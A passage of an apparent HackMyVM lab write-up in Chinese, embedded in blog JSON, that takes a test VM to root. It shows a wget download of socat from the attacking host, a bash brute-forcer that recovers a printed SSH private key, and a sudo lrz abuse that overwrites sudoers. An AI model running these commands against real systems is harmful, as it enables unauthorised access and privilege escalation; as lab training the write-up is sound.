-\n```\n\n\u4f20\u4e00\u4e2asocat\u8f6c\u53d1\u7aef\u53e3(\u8fd9\u91cc\u7684socat\u9700\u8981\u9759\u6001\u7f16\u8bd1\u7684\uff0c\u5b83\u8fd9\u4e2a\u9776\u673a\u8c8c\u4f3c\u662falpine\u7684\uff0c\u6240\u4ee5\u4f60\u76f4\u63a5\u62c9kali\u7684socat\u662f\u4e0d\u884c\u7684\uff0c\u81ea\u5df1\u53bb\u7f51\u4e0a\u4e0b\u4e00\u4e2a\uff0c\u6709\u7f16\u8bd1\u597d\u7684)\n\n```\n~ $ wget 192.168.205.128/socat\nConnecting to 192.168.205.128 (192.168.205.128:80)\nsaving to 'socat'\nsocat                100% |********************************| 4724k  0:00:00 ETA\n'socat' saved\n~ $ chmod +x socat\n~ $ ./socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &\n```\n\n\u770b\u770b\u670d\u52a1\u8f6c\u53d1\u51fa\u6765\u6ca1\u6709\uff08\u8fd9\u4e2ashell\u4f1a\u81ea\u52a8\u65ad\u5f00\uff0c\u6240\u4ee5\u5982\u679c\u65ad\u5f00\u91cd\u65b0\u8fde\u5c31\u597d\u4e86\uff0c\u53cd\u6b63\u5c31\u4f20\u4e00\u4e2asocat\u4e0a\u53bb\uff09\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p8000 192.168.205.163\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:13 EDT\nNmap scan report for 192.168.205.163\nHost is up (0.00032s latency).\n\nPORT     STATE SERVICE\n8000/tcp open  http-alt\nMAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 0.26 seconds\n```\n\n\u8bbf\u95ee\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 192.168.205.163:8000          \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 192.168.205.163:8000 -v\n*   Trying 192.168.205.163:8000...\n* Connected to 192.168.205.163 (192.168.205.163) port 8000\n* using HTTP/1.x\n> GET / HTTP/1.1\n> Host: 192.168.205.163:8000\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 0\n< \n* Connection #0 to host 192.168.205.163 left intact\n```\n\n\u76ee\u5f55\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ dirsearch -u http://192.168.205.163:8000 \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460\n\nOutput File: /mnt/hgfs/gx/x/reports/http_192.168.205.163_8000/_25-07-01_20-18-36.txt\n\nTarget: http://192.168.205.163:8000/\n\n[20:18:36] Starting: \n\nTask Completed\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.163:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.163:8000\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,html,zip,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/line                 (Status: 200) [Size: 0]\n/line2                (Status: 200) [Size: 0]\n/line1                (Status: 200) [Size: 0]\nProgress: 35450 / 1102800 (3.21%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 36260 / 1102800 (3.29%)\n===============================================================\nFinished\n===============================================================\n```\n\n\u8fd9\u91cc\u6211\u505c\u4e86\uff0c\u56e0\u4e3a\u5b83\u7206\u7834\u51fa\u6765\u7684/line\u6709\u70b9\u50cf\u5206\u5f00\u85cf\u4e1c\u897f\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 192.168.205.163:8000/line -v\n*   Trying 192.168.205.163:8000...\n* Connected to 192.168.205.163 (192.168.205.163) port 8000\n* using HTTP/1.x\n> GET /line HTTP/1.1\n> Host: 192.168.205.163:8000\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 0\n< \n* Connection #0 to host 192.168.205.163 left intact\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 192.168.205.163:8000/line/ -v\n*   Trying 192.168.205.163:8000...\n* Connected to 192.168.205.163 (192.168.205.163) port 8000\n* using HTTP/1.x\n> GET /line/ HTTP/1.1\n> Host: 192.168.205.163:8000\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 404 NOT FOUND\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 207\n< \n<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n* Connection #0 to host 192.168.205.163 left intact\n                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.163:8000/line/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.163:8000/line/\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/b                    (Status: 200) [Size: 0]\n/b3                   (Status: 200) [Size: 0]\nProgress: 465323 / 1102800 (42.19%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 466276 / 1102800 (42.28%)\n===============================================================\nFinished\n===============================================================                   \n```\n\n\u770b\u770b\u5176\u4ed6\u7684\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl -v http://192.168.205.163:8000/line1\n*   Trying 192.168.205.163:8000...\n* Connected to 192.168.205.163 (192.168.205.163) port 8000\n* using HTTP/1.x\n> GET /line1 HTTP/1.1\n> Host: 192.168.205.163:8000\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 0\n< \n* Connection #0 to host 192.168.205.163 left intact\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl -v http://192.168.205.163:8000/line2\n*   Trying 192.168.205.163:8000...\n* Connected to 192.168.205.163 (192.168.205.163) port 8000\n* using HTTP/1.x\n> GET /line2 HTTP/1.1\n> Host: 192.168.205.163:8000\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 0\n< \n* Connection #0 to host 192.168.205.163 left intact\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.163:8000/line1/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.163:8000/line1/\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/b                    (Status: 200) [Size: 0]\n/b3                   (Status: 200) [Size: 0]\nProgress: 23647 / 1102800 (2.14%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 24595 / 1102800 (2.23%)\n===============================================================\nFinished\n===============================================================\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.163:8000/line2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.163:8000/line2/\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              html,zip,php,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/Q                    (Status: 200) [Size: 0]\nProgress: 51864 / 1102800 (4.70%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 53006 / 1102800 (4.81%)\n===============================================================\nFinished\n===============================================================\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl -v http://192.168.205.163:8000/line3                                                                                                                         \n*   Trying 192.168.205.163:8000...\n* Connected to 192.168.205.163 (192.168.205.163) port 8000\n* using HTTP/1.x\n> GET /line3 HTTP/1.1\n> Host: 192.168.205.163:8000\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 0\n< \n* Connection #0 to host 192.168.205.163 left intact\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl -v http://192.168.205.163:8000/line4\n*   Trying 192.168.205.163:8000...\n* Connected to 192.168.205.163 (192.168.205.163) port 8000\n* using HTTP/1.x\n> GET /line4 HTTP/1.1\n> Host: 192.168.205.163:8000\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 0\n< \n* Connection #0 to host 192.168.205.163 left intact\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl -v http://192.168.205.163:8000/line5\n*   Trying 192.168.205.163:8000...\n* Connected to 192.168.205.163 (192.168.205.163) port 8000\n* using HTTP/1.x\n> GET /line5 HTTP/1.1\n> Host: 192.168.205.163:8000\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 0\n< \n* Connection #0 to host 192.168.205.163 left intact\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl -v http://192.168.205.163:8000/line6\n*   Trying 192.168.205.163:8000...\n* Connected to 192.168.205.163 (192.168.205.163) port 8000\n* using HTTP/1.x\n> GET /line6 HTTP/1.1\n> Host: 192.168.205.163:8000\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 404 NOT FOUND\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 207\n< \n<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n* Connection #0 to host 192.168.205.163 left intact\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.163:8000/line3/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.163:8000/line3/\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/X                    (Status: 200) [Size: 0]\nProgress: 39151 / 1102800 (3.55%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 39753 / 1102800 (3.60%)\n===============================================================\nFinished\n===============================================================\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.163:8000/line4/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.163:8000/line4/\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/A                    (Status: 200) [Size: 0]\nProgress: 28543 / 1102800 (2.59%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 28874 / 1102800 (2.62%)\n===============================================================\nFinished\n===============================================================\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.163:8000/line5/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.163:8000/line5/\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              zip,php,txt,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/5                    (Status: 200) [Size: 0]\nProgress: 23689 / 1102800 (2.15%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 24483 / 1102800 (2.22%)\n===============================================================\nFinished\n===============================================================\n```\n\n\u770b\u8d77\u6765\u50cf\u7206\u7834\u5b57\u7b26\uff0c\u5148\u7206\u7834\u4e00\u884c\u770b\u770b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ chars=({a..z} {A..Z} {0..9}); dir=''; while true; do found=false; for c in '${chars[@]}'; do testdir='$dir$c'; res=$(curl -s -o /dev/null -w '%{http_code}' 'http://192.168.205.163:8000/line1/$testdir'); [[ '$res' == '200' ]] && { echo 'Found: $testdir'; dir='$testdir'; found=true; break; }; done; $found || break; done\nFound: b\nFound: b3\nFound: b3B\nFound: b3Bl\nFound: b3Blb\nFound: b3Blbn\nFound: b3BlbnN\nFound: b3BlbnNz\nFound: b3BlbnNza\nFound: b3BlbnNzaC\nFound: b3BlbnNzaC1\nFound: b3BlbnNzaC1r\nFound: b3BlbnNzaC1rZ\nFound: b3BlbnNzaC1rZX\nFound: b3BlbnNzaC1rZXk\nFound: b3BlbnNzaC1rZXkt\nFound: b3BlbnNzaC1rZXktd\nFound: b3BlbnNzaC1rZXktdj\nFound: b3BlbnNzaC1rZXktdjE\nFound: b3BlbnNzaC1rZXktdjEA\nFound: b3BlbnNzaC1rZXktdjEAA\nFound: b3BlbnNzaC1rZXktdjEAAA\nFound: b3BlbnNzaC1rZXktdjEAAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAAB\nFound: b3BlbnNzaC1rZXktdjEAAAAABG\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5v\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vb\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbm\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmU\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAE\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEb\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9u\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZ\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAM\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMw\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAA\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAt\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2g\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZ\nFound: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ echo 'b3BlbnNzaC1rZXktdjE' | base64 -d \nopenssh-key-v1                                                                  \n```\n\n\u662fOpenSSH\u79c1\u94a5\n\u91cd\u65b0\u5199\u4e00\u4e2a\u811a\u672c\n\n```\n#!/bin/bash\n\nchars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+='\ndir=''\n\nfor line in {1..5}; do\n  url='http://192.168.205.163:8000/line$line/'\n  dir=''\n  while true; do\n    found=0\n    for ((i=0; i<${#chars}; i++)); do\n      c='${chars:$i:1}'\n      testdir='$dir$c'\n      code=$(curl -s -o /dev/null -w '%{http_code}' '$url$testdir')\n      if [ '$code' = '200' ]; then\n        dir='$testdir'\n        echo -n '$c'\n        found=1\n        break\n      fi\n    done\n    [ $found -eq 0 ] && break\n  done\n  echo\ndone\n```\n\n\u8fd0\u884c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ bash bp.sh\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u\nXwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw\nAAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J\n5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=\n```\n\n\u62fc\u63a5\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ cat id_rsa \n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u\nXwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw\nAAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J\n5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=\n-----END OPENSSH PRIVATE KEY-----\n```\n\n\u6539\u6743\u9650\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ chmod 600 id_rsa\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh asahi@192.168.205.163 -i id_rsa\nThe authenticity of host '192.168.205.163 (192.168.205.163)' can't be established.\nED25519 key fingerprint is SHA256:y+2KKHDaMy8FmNZpu0PMG4PJ+b1w5rQQScGZYvJj4L8.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:8: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.163' (ED25519) to the list of known hosts.\n\nfuzzz:~$ id\nuid=1001(asahi) gid=1001(asahi) groups=1001(asahi)\nfuzzz:~$ sudo -l\nMatching Defaults entries for asahi on fuzzz:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults for asahi:\n    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'\n\nUser asahi may run the following commands on fuzzz:\n    (ALL) NOPASSWD: /usr/local/bin/lrz\n```\n\nlrz\u7528\u4e8e\u901a\u8fc7 ZMODEM/YMODEM/XMODEM \u534f\u8bae\u63a5\u6536\u6587\u4ef6\n\n\u7136\u540e\u770b\u5e2e\u52a9\u6587\u6863\n\n```\n-C, --allow-remote-commands allow execution of remote commands (Z)\n```\n\n\u8fd9\u4e2a\u9009\u9879\u7684\u5b57\u9762\u610f\u601d\u5c31\u662f\u201c**\u5141\u8bb8\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4**\u201d\u3002\n\n\u7136\u540e\u6252\u62c9\u4e86\u5f88\u4e45\uff0c\u90fd\u6ca1\u884c\n\n\u6211\u4e5f\u5c1d\u8bd5\u4e86\u4e0a\u4f20\u6587\u4ef6\u8986\u76d6\uff0c\u4f46\u662f\u5e94\u8be5\u662f\u6211Tabby\u6709\u95ee\u9898\uff0c\u8986\u76d6\u4e0d\u4e86\n\n\u540e\u9762\u770b\u5230\n\n```\n--tcp-server            open socket, wait for connection (Z)\n```\n\nso\n\n```\nfuzzz:/etc$ sudo /usr/local/bin/lrz --tcp-server\nconnect with lrz --tcp-client 'fuzzz.hmv:46143'\n```\n\nkali\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat sudoers\nasahi ALL=(ALL:ALL) NOPASSWD: ALL\n                                         \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ sz --tcp-client 192.168.205.163:46143 -y sudoers\nconnecting to [192.168.205.163] <46143>\n```\n\n\u9776\u673a\u5f39\u51fa\u4e86\n\n```\nlrz waiting to receive.fuzzz:/etc$ sudo -l\nUser asahi may run the following commands on fuzzz:\n    (ALL : ALL) NOPASSWD: ALL\nfuzzz:/etc$ sudo su\n/etc # id\nuid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n/etc # cat /root/root.flag \nflag{46a0e055d5db8d82eee6e7eb3ee3ccf64be3fca2}\n/etc # cat /home/asahi/user.flag \nflag{da39a3ee5e6b4b0d3255bfef95601890afd80709}\n```\n\nsentence", "top": 0, "createdAt": 1751420091, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-02", "dateLabelColor": "#0969da"}, "P130": {"htmlDir": "docs/post/Challenge 053.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 053", "postUrl": "post/Challenge%20053.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/130", "commentNum": 0, "wordCount": 1948, "description": "![image-20250705184956768](https://7r1umphk.github.io/image/20250705185005753.webp)\n\nhttps://hackmyvm.eu/challenges/challenge.php?c=053\n\n```\n<pre> 9950b5c66f8518f8b012359dc7390589 c03ec75734f58d87cddff35c57786429 e757e84e31ef68a74d86d6b52478654c HMV{c761d942cf5fe4ba9ece382739afef4e} </pre>\n```\n\n\u770b\u7740\u50cfhash\n\n![image-20250705185544591](https://7r1umphk.github.io/image/20250705185544745.webp)\n\n\u50cf\u627e\u89c4\u5f8b\uff0c\u751f\u6210\u5b57\u5178\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ crunch 7 7 -t 1@@@@@4 -o pass                  \nCrunch will now generate the following amount of data: 95051008 bytes\n90 MB\n0 GB\n0 TB\n0 PB\nCrunch will now generate the following number of lines: 11881376 \n\ncrunch: 100% completed generating output\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ tail -n 1 pass\n1zzzzz4\n                                                                                                                                                                                  